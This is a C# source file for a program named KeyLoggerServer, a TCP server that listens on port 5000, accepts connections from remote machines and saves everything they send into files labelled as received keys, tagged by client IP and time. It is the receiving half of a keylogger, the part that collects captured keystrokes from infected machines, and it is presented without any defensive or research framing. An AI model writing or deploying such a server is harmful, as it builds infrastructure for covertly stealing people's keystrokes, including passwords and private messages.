using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace KeyLoggerServer
{
    class Program
    {
        static void Main(string[] args)
        {
            int port = 5000;
            TcpListener listener = new TcpListener(IPAddress.Any, port);

            Console.WriteLine($"\nStarting TCP server on port {port}...");
            listener.Start();
            Console.WriteLine("\nServer is running. Waiting for connections...");

            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                ThreadPool.QueueUserWorkItem(HandleClient, client);
            }
        }

        static void HandleClient(object state)
        {
            TcpClient client = (TcpClient)state;

            try
            {
                // Create a unique log file per client connection/timestamp
                IPEndPoint remoteEndPoint = (IPEndPoint)client.Client.RemoteEndPoint;
                string clientIP = remoteEndPoint.Address.ToString();
                string timeStamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                string logFilePath = $"received_keys_{clientIP}_{timeStamp}.txt";
                Console.WriteLine($"\nClient connected from {clientIP}. Logging to {logFilePath}");

                using (NetworkStream stream = client.GetStream())
                using (StreamWriter writer = new StreamWriter(logFilePath, true) { AutoFlush = true })
                {
                    byte[] buffer = new byte[1024];
                    int bytesRead;

                    // Read data until the client disconnects or an error occurs
                    while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        string data = System.Text.Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        Console.Write(data);
                        writer.Write(data);
                    }
                }

                Console.WriteLine($"\nClient {clientIP} disconnected.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\nError handling client: {ex.Message}");
            }
            finally
            {
                client.Close();
            }
        }
    }
}
